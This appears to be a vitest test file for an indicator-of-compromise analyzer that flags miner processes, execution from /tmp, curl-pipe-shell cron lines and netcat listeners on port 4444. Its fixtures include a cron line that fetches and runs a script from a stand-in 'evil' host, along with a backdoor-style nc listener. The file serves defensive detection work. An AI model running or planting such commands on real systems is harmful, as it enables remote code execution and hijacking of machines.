import { describe, it, expect } from 'vitest';
import { analyze } from './ioc.js';

describe('ioc analyze', () => {
  it('flags a high-CPU random-named process (miner pattern)', () => {
    const ps = 'USER PID %CPU COMMAND\nroot 1234 1599 aa162766';
    const f = analyze(ps);
    expect(f.some((x) => x.severity === 'high' && /CPU/i.test(x.title))).toBe(true);
  });
  it('flags a known miner name', () => {
    const f = analyze('root 22 4.0 /usr/bin/xmrig --donate 1');
    expect(f.some((x) => /miner|xmrig/i.test(x.title + x.detail))).toBe(true);
  });
  it('flags execution from /tmp', () => {
    const f = analyze('root 90 0.1 /tmp/.x/kdevtmpfsi');
    expect(f.some((x) => /tmp|dev\/shm/i.test(x.detail))).toBe(true);
  });
  it('flags a curl-pipe-shell cron line', () => {
    const f = analyze('*/5 * * * * curl -s http://evil/x.sh | sh');
    expect(f.some((x) => /cron|pipe|shell/i.test(x.title))).toBe(true);
  });
  it('flags a listening backdoor-ish port bound to 0.0.0.0', () => {
    const f = analyze('LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=9,fd=3))');
    expect(f.some((x) => /port|listen/i.test(x.title))).toBe(true);
  });
  it('returns no findings for benign input', () => {
    expect(analyze('root 1 0.0 /usr/lib/systemd/systemd').length).toBe(0);
  });
});
